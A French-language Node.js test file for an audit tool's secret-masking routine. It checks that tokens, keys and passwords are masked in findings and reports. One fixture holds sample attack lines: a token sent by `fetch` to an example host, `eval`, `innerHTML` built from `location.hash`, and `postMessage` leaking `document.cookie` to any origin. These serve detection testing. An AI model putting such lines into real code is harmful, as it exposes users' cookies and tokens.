/**
 * Aucun texte qu'un rapport affiche ne redit un secret en entier, quelle que soit la règle qui l'a écrit (relevé de la coordination, v23 :
 * C-EXFIL-01 recopiait, dans son extrait, un jeton GitHub de quarante caractères placé dans une adresse `fetch`, et on le retrouvait dans
 * `rapport.json`, `rapport.html` et `rapport.md`).
 *
 * Le masque est `masquerLesSecrets` (`src/regles/c-secrets.js`), appelé par `constat()` (`src/moteur/modele.js`) à la création de chaque constat :
 *  - tout format de fournisseur devient `masquer(valeur)` (quatre caractères de chaque côté), une clé privée perd son corps ; une clé publique par
 *    conception et un leurre ne sont pas des secrets, ils restent tels quels ;
 *  - dans du code (l'extrait et la preuve, non la prose), la valeur d'un « nom = valeur » que C-SECRET-01 signalerait est masquée aussi ;
 *  - il passe avant la coupe de l'extrait à trois cents caractères : un jeton que la coupe partagerait n'est plus reconnu ;
 *  - une preuve profonde de plus de trente-deux niveaux, ou qui boucle sur elle-même, est remplacée par `[trop profond]`.
 * Les sorties du binaire sont dans `tests/masque-des-secrets-cli.test.mjs`. Chaque essai a son mutant dans `scripts/mutants-c-secret.mjs`.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { auditer, page } from './aide-surface.mjs';
import { masquerLesSecrets, masquer, jugerValeur, formatsDans } from '../src/regles/c-secrets.js';
import { constat } from '../src/moteur/modele.js';
import { noter } from '../src/moteur/notation.js';
import { genererJson } from '../src/rapport/json.js';
import { genererHtml } from '../src/rapport/html.js';
import { genererMarkdown } from '../src/rapport/markdown.js';
import { genererSarif } from '../src/rapport/sarif.js';
import { comparerRapports, genererDiffMarkdown } from '../src/rapport/diff.js';
import { SECRETS, PUBLIQUES, LEURRES, jeton, generee, tirer, ALNUM } from './aide-secrets.mjs';

const BASE = { regle: 'X-01', axe: 'A', severite: 'mineur', titre: 'un titre', constat: 'un constat' };
const ghp = () => `gh${'p_'}${tirer(36, ALNUM)}`;
/** Ce qu'aucun masque ne montre d'un jeton : ni ses cinq premiers ni ses cinq derniers caractères ne sont le milieu. */
const milieu = (valeur) => valeur.slice(5, -5);
const MOT_DE_PASSE = "password = 'Soleil2024!'";

// --- masquerLesSecrets -----------------------------------------------------------------------------------------------------

test('masquerLesSecrets : chaque format de fournisseur devient son masque, au début, au milieu et à la fin d\'un texte', () => {
  for (const { id, valeur } of SECRETS) {
    for (const [nom, texte] of [['au début', `${valeur} puis du texte`], ['au milieu', `du texte ${valeur} puis du texte`], ['à la fin', `du texte ${valeur}`], ['dans une adresse', `https://a.example/x?t=${valeur}&u=1`]]) {
      const sortie = masquerLesSecrets(texte);
      if (id === 'pem') {
        assert.ok(sortie.includes('-----BEGIN RSA PRIVATE KEY----- (corps non reproduit)'), `${id} ${nom} : l'en-tête reste, le corps n'est pas reproduit`);
        assert.ok(!sortie.includes(valeur.slice(40, 90)), `${id} ${nom} : le corps de la clé est perdu`);
        assert.ok(!sortie.includes('END RSA PRIVATE KEY'), `${id} ${nom} : le pied de la clé est perdu avec son corps`);
      } else {
        assert.equal(sortie, texte.replace(valeur, masquer(valeur)), `${id} ${nom}`);
        assert.ok(!sortie.includes(milieu(valeur)), `${id} ${nom} : le milieu du secret est dit`);
      }
    }
  }
});

test('masquerLesSecrets : une clé privée perd son corps, et ce qui suit son pied reste', () => {
  const pem = SECRETS.find((s) => s.id === 'pem').valeur;
  assert.equal(masquerLesSecrets(`avant ${pem} après`), 'avant -----BEGIN RSA PRIVATE KEY----- (corps non reproduit) après');
  // Sans pied : le corps va jusqu'à la fin du texte.
  const sansPied = pem.slice(0, pem.indexOf('-----END'));
  assert.equal(masquerLesSecrets(`avant ${sansPied}`), 'avant -----BEGIN RSA PRIVATE KEY----- (corps non reproduit)');
  // Le pied est cherché après l'en-tête : un pied qui ne ferme pas (`-----END` sans ses tirets) va aussi jusqu'à la fin.
  const pied = `${pem.slice(0, pem.indexOf('-----END'))}-----END RSA PRIVATE KEY puis du texte`;
  assert.equal(masquerLesSecrets(`avant ${pied}`), 'avant -----BEGIN RSA PRIVATE KEY----- (corps non reproduit)');
});

test('masquerLesSecrets : deux clés privées, un jeton dans le corps d\'une clé, un jeton contre son pied : chaque secret est masqué une fois, le texte qui les sépare reste', () => {
  const pem = SECRETS.find((s) => s.id === 'pem').valeur;
  const entete = '-----BEGIN RSA PRIVATE KEY----- (corps non reproduit)';
  // Le pied d'une clé est cherché depuis son en-tête : le pied de la première n'est pas celui de la seconde.
  assert.equal(masquerLesSecrets(`avant ${pem} milieu ${pem} après`), `avant ${entete} milieu ${entete} après`);
  // Un jeton dans le corps de la clé est masqué avec elle, une seule fois, sans que le texte du corps revienne.
  const ghToken = ghp();
  const corps = tirer(64, ALNUM);
  const dedans = `-----BEGIN RSA PRIVATE KEY-----\n${corps}\n${ghToken}\n-----END RSA PRIVATE KEY-----`;
  assert.deepEqual(formatsDans(dedans).map((t) => t.format.id), ['pem', 'github'], 'la prémisse : le jeton du corps est reconnu à part');
  assert.equal(masquerLesSecrets(`avant ${dedans} après`), `avant ${entete} après`);
  // Un jeton contre le pied de la clé (rien entre les deux) n'est pas couvert par elle : il est masqué à part.
  const contre = `-----BEGIN RSA PRIVATE KEY-----\n${corps}\n-----END RSA PRIVATE KEY-----${ghToken} fin`;
  assert.deepEqual(formatsDans(contre).map((t) => t.format.id), ['pem', 'github'], 'la prémisse : le jeton contre le pied est reconnu à part');
  assert.equal(masquerLesSecrets(contre), `${entete}${masquer(ghToken)} fin`);
});

test('masquerLesSecrets : une clé publique par conception n\'est pas un secret, un JWT de rôle anonyme non plus ; tout autre JWT est masqué', () => {
  for (const { id, valeur } of PUBLIQUES) assert.equal(masquerLesSecrets(`cle ${valeur} fin`), `cle ${valeur} fin`, id);
  const anonyme = jeton({ iss: 'supabase', role: 'anon' });
  assert.equal(masquerLesSecrets(`cle ${anonyme} fin`), `cle ${anonyme} fin`);
  const serveur = jeton({ iss: 'supabase', role: 'service_role' });
  assert.equal(masquerLesSecrets(`cle ${serveur} fin`), `cle ${masquer(serveur)} fin`);
  // La clé publique et le secret dans le même texte : seul le secret est masqué.
  const ensemble = `pub ${PUBLIQUES[0].valeur} sec ${SECRETS[1].valeur}`;
  assert.equal(masquerLesSecrets(ensemble), `pub ${PUBLIQUES[0].valeur} sec ${masquer(SECRETS[1].valeur)}`);
});

test('masquerLesSecrets : ce qui se voit faux n\'est pas un secret et n\'est pas masqué : les huit leurres de la coordination, seuls ou derrière un nom', () => {
  for (const { nom, champ, valeur } of LEURRES) {
    assert.equal(masquerLesSecrets(valeur), valeur, `${nom} : seul`);
    assert.equal(masquerLesSecrets(`${champ}=${valeur}`), `${champ}=${valeur}`, `${nom} : derrière son nom`);
    assert.equal(masquerLesSecrets(`const ${champ} = '${valeur}';`), `const ${champ} = '${valeur}';`, `${nom} : dans du code`);
  }
});

test('masquerLesSecrets : la valeur d\'un « nom = valeur » que C-SECRET-01 signalerait est masquée dans du code, celle qu\'elle ne signale pas ne l\'est pas', () => {
  const v = generee(24);
  assert.equal(jugerValeur('apiKey', v).verdict, 'generee', 'la prémisse : cette valeur a l\'allure d\'une valeur générée');
  assert.equal(masquerLesSecrets(`const apiKey = '${v}';`), `const apiKey = '${masquer(v)}';`, 'allure générée, dans du code');
  assert.equal(masquerLesSecrets(`API_KEY=${v}`), `API_KEY=${masquer(v)}`, 'allure générée, ligne de configuration');
  assert.equal(masquerLesSecrets(`{ "token": "${v}" }`), `{ "token": "${masquer(v)}" }`, 'allure générée, JSON');
  assert.equal(jugerValeur('password', 'Soleil2024!').verdict, 'a_verifier');
  assert.equal(masquerLesSecrets(MOT_DE_PASSE), `password = '${masquer('Soleil2024!')}'`, 'à vérifier : masqué aussi, c\'est peut-être un vrai mot de passe');
  for (const [nom, texte] of [
    ['vide', "password = ''"], ['remplacement', "password = 'changeme'"], ['le nom redit', "token = 'TOKEN'"], ['un libellé', "password = 'Passwort'"],
    ['trop court', "password = 'abc123'"], ['un nom qui n\'évoque pas un secret', `title = '${v}'`], ['une adresse', "apiKey = 'https://a.example/cle'"],
  ]) assert.equal(masquerLesSecrets(texte), texte, nom);
});

test('masquerLesSecrets : la prose n\'a pas de « nom = valeur » (formats seulement) ; le code en a', () => {
  const v = generee(24);
  assert.equal(masquerLesSecrets(`const apiKey = '${v}';`, { code: false }), `const apiKey = '${v}';`);
  assert.equal(masquerLesSecrets(MOT_DE_PASSE, { code: false }), MOT_DE_PASSE);
  // Un format, lui, est masqué partout.
  const ghToken = ghp();
  assert.equal(masquerLesSecrets(`Le jeton ${ghToken} fuit`, { code: false }), `Le jeton ${masquer(ghToken)} fuit`);
  assert.equal(masquerLesSecrets(`apiKey = '${ghToken}'`, { code: false }), `apiKey = '${masquer(ghToken)}'`);
});

test('masquerLesSecrets : un format dans une valeur, une valeur avant un format, deux valeurs : chaque secret est masqué une fois, le reste est gardé', () => {
  const ghToken = ghp();
  // Un format au milieu d'une valeur de nom : seul le format est masqué (le format est la preuve, le reste est du texte).
  assert.equal(masquerLesSecrets(`apiKey = 'le jeton ${ghToken} fuit'`), `apiKey = 'le jeton ${masquer(ghToken)} fuit'`);
  // Un format collé par un tiret à un mot, dans une valeur qui n'a pas de blanc (elle a, à elle seule, l'allure d'une valeur générée) : le format est masqué, non la valeur entière.
  assert.equal(jugerValeur('apiKey', `Bearer-${ghToken}`).verdict, 'generee', 'la prémisse : cette valeur est signalée par C-SECRET-01');
  assert.equal(masquerLesSecrets(`apiKey = 'Bearer-${ghToken}'`), `apiKey = 'Bearer-${masquer(ghToken)}'`);
  // Une valeur à vérifier, puis un format : dans l'ordre du texte, sans que l'un en mange l'autre.
  assert.equal(masquerLesSecrets(`${MOT_DE_PASSE}; fetch('/x?t=${ghToken}')`), `password = '${masquer('Soleil2024!')}'; fetch('/x?t=${masquer(ghToken)}')`);
  // Deux formats, deux valeurs : chacun son masque.
  const [a, b] = [ghp(), ghp()];
  const v = generee(24);
  assert.equal(masquerLesSecrets(`${a} ${b} apiKey = '${v}' ${MOT_DE_PASSE}`), `${masquer(a)} ${masquer(b)} apiKey = '${masquer(v)}' password = '${masquer('Soleil2024!')}'`);
});

test('masquerLesSecrets : idempotent, et une valeur déjà masquée ne l\'est pas une seconde fois', () => {
  const v = generee(24);
  const textes = [
    `const apiKey = '${v}';`, MOT_DE_PASSE, `a ${ghp()} b`, `${SECRETS[6].valeur} fin`, `apiKey = '${ghp()}'`,
    `${ghp()} ${jeton({ role: 'service_role' })} ${PUBLIQUES[0].valeur}`,
  ];
  for (const t of textes) {
    const une = masquerLesSecrets(t);
    assert.equal(masquerLesSecrets(une), une, t.slice(0, 40));
  }
  // Ce que C-SECRET-01 écrit dans son propre extrait (`nom = valeur masquée`) passe par `constat()` : il ne se masque pas une seconde fois.
  const dejaMasque = `apiKey = ${masquer(v)}`;
  assert.equal(masquerLesSecrets(dejaMasque), dejaMasque);
  assert.equal(masquerLesSecrets(`password = '${masquer('Soleil2024!')}'`), `password = '${masquer('Soleil2024!')}'`);
});

test('masquerLesSecrets : ce qui n\'est pas un texte, ou n\'en dit rien, est rendu tel quel', () => {
  for (const x of [undefined, null, 42, true, {}, []]) assert.equal(masquerLesSecrets(x), x);
  const court = 'petit';
  assert.equal(masquerLesSecrets(court), court);
  const sain = 'Un texte sans aucun secret, avec des mots : token, password, secret, apiKey.';
  assert.equal(masquerLesSecrets(sain), sain);
  assert.equal(masquerLesSecrets(''), '');
  // Le plus court texte qui porte un secret (`token=` puis huit caractères qui n'ont rien d'une suite) est lu.
  assert.equal(jugerValeur('token', 'Zq7Kp2Rm').verdict, 'a_verifier');
  assert.equal(masquerLesSecrets('token=Zq7Kp2Rm'), `token=${masquer('Zq7Kp2Rm')}`);
});

// --- constat() : chaque champ de texte, de toute règle ---------------------------------------------------------------------

test('constat() : le masque traverse chaque champ de texte, de toute règle : titre, constat, impact et remédiation (les formats), extrait et preuve (les formats et les affectations)', () => {
  const ghToken = ghp();
  const v = generee(24);
  for (const regle of ['A-01', 'B-02', 'C-EXFIL-01', 'D-RESEAU-01', 'E-DEP-01', 'F-03']) {
    const c = constat({
      ...BASE, regle,
      titre: `Fuite de ${ghToken}`, constat: `Le jeton ${ghToken} est envoyé`, impact: `Avec ${ghToken}`, remediation: `Révoquer ${ghToken}`,
      extrait: `fetch('https://api.example.com/x?t=${ghToken}')`,
      preuve: { requete: `GET /x?t=${ghToken}`, liste: [`a ${ghToken}`, { profond: `b ${ghToken}` }], nombre: 3, vide: null, vrai: true },
    });
    assert.equal(c.titre, `Fuite de ${masquer(ghToken)}`, `${regle} : titre`);
    assert.equal(c.constat, `Le jeton ${masquer(ghToken)} est envoyé`, `${regle} : constat`);
    assert.equal(c.impact, `Avec ${masquer(ghToken)}`, `${regle} : impact`);
    assert.equal(c.remediation, `Révoquer ${masquer(ghToken)}`, `${regle} : remédiation`);
    assert.equal(c.extrait, `fetch('https://api.example.com/x?t=${masquer(ghToken)}')`, `${regle} : extrait`);
    assert.deepEqual(c.preuve, { requete: `GET /x?t=${masquer(ghToken)}`, liste: [`a ${masquer(ghToken)}`, { profond: `b ${masquer(ghToken)}` }], nombre: 3, vide: null, vrai: true }, `${regle} : preuve`);
    assert.ok(!JSON.stringify(c).includes(milieu(ghToken)), `${regle} : le milieu du jeton est dit quelque part`);
  }
  // Une valeur d'allure générée derrière un nom : dans le code (extrait, preuve) elle est masquée, dans la prose non.
  const c = constat({
    ...BASE, titre: MOT_DE_PASSE, constat: MOT_DE_PASSE, impact: MOT_DE_PASSE, remediation: MOT_DE_PASSE,
    extrait: `apiKey = '${v}'`, preuve: { code: `apiKey = '${v}'`, autre: MOT_DE_PASSE },
  });
  assert.equal(c.titre, MOT_DE_PASSE, 'la prose du titre n\'a pas de « nom = valeur »');
  assert.equal(c.constat, MOT_DE_PASSE, 'la prose du constat n\'a pas de « nom = valeur »');
  assert.equal(c.impact, MOT_DE_PASSE, 'la prose de l\'impact n\'a pas de « nom = valeur »');
  assert.equal(c.remediation, MOT_DE_PASSE, 'la prose de la remédiation n\'a pas de « nom = valeur »');
  assert.equal(c.extrait, `apiKey = '${masquer(v)}'`, 'l\'extrait est du code');
  assert.deepEqual(c.preuve, { code: `apiKey = '${masquer(v)}'`, autre: `password = '${masquer('Soleil2024!')}'` }, 'la preuve est du code');
});

test('constat() : un champ absent le reste ; un constat sans secret garde sa preuve telle quelle, et la preuve de la règle n\'est jamais modifiée', () => {
  const c = constat({ ...BASE });
  assert.equal(c.impact, null);
  assert.equal(c.remediation, null);
  assert.equal(c.extrait, null);
  assert.equal(c.preuve, null);
  const sans = { a: { b: [1, 2, { c: 'rien' }] } };
  assert.equal(constat({ ...BASE, preuve: sans }).preuve, sans, 'sans secret : le même objet, sans copie');
  const ghToken = ghp();
  const saine = { b: [1, { c: 'rien' }] };
  const preuve = { saine, lu: `x ${ghToken}`, liste: ['y', `z ${ghToken}`, 'w'] };
  const copie = constat({ ...BASE, preuve }).preuve;
  assert.notEqual(copie, preuve, 'avec un secret : une copie');
  assert.equal(copie.saine, saine, 'une branche sans secret n\'est pas copiée');
  assert.equal(preuve.lu, `x ${ghToken}`, 'la preuve de la règle n\'est pas modifiée');
  assert.equal(preuve.liste[1], `z ${ghToken}`, 'une liste de la règle n\'est pas modifiée non plus');
  assert.deepEqual(copie.liste, ['y', `z ${masquer(ghToken)}`, 'w']);
  // Un objet qui n'est pas une donnée simple (une classe) est laissé, une fonction aussi.
  class Boite { constructor() { this.t = `x ${ghToken}`; } }
  const boite = new Boite();
  const f = () => 1;
  const mixte = constat({ ...BASE, preuve: { boite, f, n: 1 } }).preuve;
  assert.equal(mixte.boite, boite);
  assert.equal(mixte.f, f);
});

test('constat() : le masque passe avant la coupe de l\'extrait à trois cents caractères : un jeton que la coupe partagerait est masqué avant, non montré à moitié', () => {
  const ghToken = ghp();
  for (const debut of [270, 281, 290, 299]) {
    const extrait = `${'y'.repeat(debut)} ${ghToken} ${'z'.repeat(50)}`;
    const c = constat({ ...BASE, extrait });
    assert.ok(!c.extrait.includes(ghToken.slice(5, 15)), `jeton à ${debut} : des caractères du milieu du jeton restent dans l'extrait coupé`);
    assert.ok(c.extrait.length <= 300, 'l\'extrait reste coupé à 300 caractères');
    assert.equal(c.extrait, `${'y'.repeat(debut)} ${masquer(ghToken)} ${'z'.repeat(50)}`.slice(0, 300), `jeton à ${debut}`);
  }
  // Les blancs repliés ne changent rien à ce qui est masqué : le jeton n'en contient pas.
  const replie = constat({ ...BASE, extrait: `a\n\n   b ${ghToken}\t\tc` });
  assert.equal(replie.extrait, `a b ${masquer(ghToken)} c`);
  // Un extrait qui n'est pas un texte est lu comme un texte.
  assert.equal(constat({ ...BASE, extrait: 12345678 }).extrait, '12345678');
});

test('constat() : une preuve de plus de trente-deux niveaux, ou qui boucle sur elle-même, est remplacée par « [trop profond] », jamais rendue telle quelle', () => {
  const ghToken = ghp();
  const imbrique = (niveaux, feuille) => { let x = feuille; for (let i = 0; i < niveaux; i++) x = { s: x }; return x; };
  const profondeur = (x) => { let n = 0; while (x !== null && typeof x === 'object') { x = x.s; n++; } return { n, feuille: x }; };
  // L'objet de la preuve est au niveau 0 : trente-deux objets imbriqués (niveaux 0 à 31) se lisent, la feuille au bout est masquée.
  const lue = constat({ ...BASE, preuve: imbrique(32, `x ${ghToken}`) }).preuve;
  assert.deepEqual(profondeur(lue), { n: 32, feuille: `x ${masquer(ghToken)}` });
  // Trente-trois : l'objet du niveau 32 n'est pas lu, il est remplacé.
  const trop = constat({ ...BASE, preuve: imbrique(33, `x ${ghToken}`) }).preuve;
  assert.deepEqual(profondeur(trop), { n: 32, feuille: '[trop profond]' });
  assert.ok(!JSON.stringify(trop).includes(milieu(ghToken)));
  // Une liste compte comme un niveau, comme un objet.
  let listes = `x ${ghToken}`;
  for (let i = 0; i < 40; i++) listes = [listes];
  const l = constat({ ...BASE, preuve: { l: listes } }).preuve;
  assert.ok(!JSON.stringify(l).includes(milieu(ghToken)));
  assert.ok(JSON.stringify(l).includes('[trop profond]'));
  // Une preuve qui boucle : lue sur trente-deux niveaux puis coupée, et le rapport s'écrit (JSON.stringify ne lève pas).
  const boucle = { nom: 'cycle', texte: `x ${ghToken}` };
  boucle.encore = boucle;
  const cycle = constat({ ...BASE, preuve: boucle }).preuve;
  const json = JSON.stringify(cycle);
  assert.ok(json.includes('[trop profond]'));
  assert.ok(!json.includes(milieu(ghToken)));
});

test('constat() : les emplacements au-delà du plafond ne sont pas parcourus : la preuve est bornée d\'abord, masquée ensuite', () => {
  const ghToken = ghp();
  const emplacements = Array.from({ length: 600 }, (_, i) => ({ ligne: i + 1, texte: i === 10 || i === 550 ? `t ${ghToken}` : 'rien' }));
  const c = constat({ ...BASE, preuve: { emplacements } });
  assert.equal(c.preuve.emplacements.length, 500);
  assert.equal(c.preuve.emplacementsOmis, 100);
  assert.equal(c.preuve.emplacements[10].texte, `t ${masquer(ghToken)}`, 'un secret gardé est masqué');
  assert.ok(!JSON.stringify(c.preuve).includes(milieu(ghToken)), 'un secret omis n\'est nulle part');
  assert.equal(emplacements[550].texte, `t ${ghToken}`, 'la preuve de la règle n\'est pas modifiée');
});

test('constat() : un objet sans prototype, dans une preuve, est lu comme un objet simple ; une instance de classe est laissée telle quelle', () => {
  const ghToken = ghp();
  const nu = Object.create(null);
  nu.texte = `x ${ghToken}`;
  nu.nombre = 3;
  const lue = constat({ ...BASE, preuve: { nu } }).preuve;
  assert.equal(lue.nu.texte, `x ${masquer(ghToken)}`, 'le texte d\'un objet sans prototype est masqué');
  assert.equal(lue.nu.nombre, 3);
  assert.equal(nu.texte, `x ${ghToken}`, 'la preuve de la règle n\'est pas modifiée');
  class Boite { constructor() { this.texte = `x ${ghToken}`; } }
  const boite = new Boite();
  assert.equal(constat({ ...BASE, preuve: { boite } }).preuve.boite, boite, 'une instance de classe est laissée telle quelle');
});

test('constat() : les emplacements omis ne sont jamais lus : la preuve est bornée d\'abord, masquée ensuite', () => {
  // Un accesseur compte les lectures de chaque emplacement : ceux au-delà du plafond ne sont pas parcourus, ceux qu'on garde le sont (et sont masqués).
  const lectures = new Array(600).fill(0);
  const emplacements = Array.from({ length: 600 }, (_, i) => {
    const e = { ligne: i + 1 };
    Object.defineProperty(e, 'texte', { enumerable: true, get() { lectures[i]++; return 'rien'; } });
    return e;
  });
  const c = constat({ ...BASE, preuve: { emplacements } });
  assert.equal(c.preuve.emplacements.length, 500);
  assert.equal(lectures.slice(500).reduce((a, b) => a + b, 0), 0, 'aucun des cent emplacements omis n\'est lu');
  assert.ok(lectures.slice(0, 500).every((n) => n > 0), 'chacun des cinq cents emplacements gardés est lu, donc masqué');
});

// --- Les rapports, par des règles qui recopient du code ou une adresse ------------------------------------------------------

test('aucun rapport (JSON, HTML, Markdown, SARIF, comparaison) ne redit un jeton qu\'une règle a recopié : C-EXFIL-01, C-XSS-01, C-XSS-03, C-PM-02, E-DEP-01', async () => {
  const JETONS = { exfil: ghp(), eval: ghp(), html: ghp(), message: ghp(), importe: ghp() };
  const code = [
    `fetch('https://api.example.com/x?t=${JETONS.exfil}');`,
    `eval("var t = '${JETONS.eval}'");`,
    `document.body.innerHTML = '<img src="https://a.example/?t=${JETONS.html}">' + location.hash;`,
    `parent.postMessage({ t: '${JETONS.message}', c: document.cookie }, '*');`,
    `import('https://a.example/m.js?t=${JETONS.importe}');`,
  ].join('\n') + '\n';
  const fichiers = { 'index.html': page('<script src="app.js"></script>'), 'app.js': code };
  const a = await auditer(fichiers);
  const sain = await auditer({ ...fichiers, 'app.js': 'var x = 1;\n' });

  // Les règles ont bien trouvé ces lignes, et chacune dit son jeton masqué : l'essai ne réussit pas faute d'avoir rien trouvé.
  const parRegle = { exfil: 'C-EXFIL-01', eval: 'C-XSS-03', html: 'C-XSS-01', message: 'C-PM-02', importe: 'E-DEP-01' };
  for (const [cle, regle] of Object.entries(parRegle)) {
    const trouves = a.de(regle).filter((c) => JSON.stringify(c).includes(masquer(JETONS[cle])));
    assert.ok(trouves.length > 0, `${regle} : aucun constat ne dit le jeton masqué`);
  }

  const meta = { version: 'x', nomDepot: 'essai', commit: null, cible: null };
  const rapport = (audit) => ({ ctx: audit.ctx, notation: noter(audit.constats, new Set(['D'])), meta });
  const avant = rapport(a);
  const apres = rapport(sain);
  const diff = comparerRapports(JSON.parse(genererJson(avant)), JSON.parse(genererJson(apres)));
  assert.ok(diff.corriges.length > 0, 'la comparaison a des constats à dire');
  const sorties = {
    json: genererJson(avant), html: genererHtml(avant), markdown: genererMarkdown(avant), sarif: genererSarif(avant),
    'comparaison Markdown': genererDiffMarkdown(diff, { ancienChemin: 'a.json', nouveauChemin: 'b.json' }),
    'comparaison JSON': JSON.stringify(diff),
  };
  for (const [sortie, texte] of Object.entries(sorties)) {
    for (const [cle, jetonEntier] of Object.entries(JETONS)) {
      assert.ok(!texte.includes(jetonEntier), `${sortie} : le jeton « ${cle} » est dit en entier`);
      assert.ok(!texte.includes(milieu(jetonEntier)), `${sortie} : le milieu du jeton « ${cle} » est dit`);
    }
  }
  // Le JSON, lui, porte les jetons masqués : c'est ce que la règle a à dire.
  for (const jetonEntier of Object.values(JETONS)) assert.ok(sorties.json.includes(masquer(jetonEntier)), 'le JSON dit le jeton masqué');
});
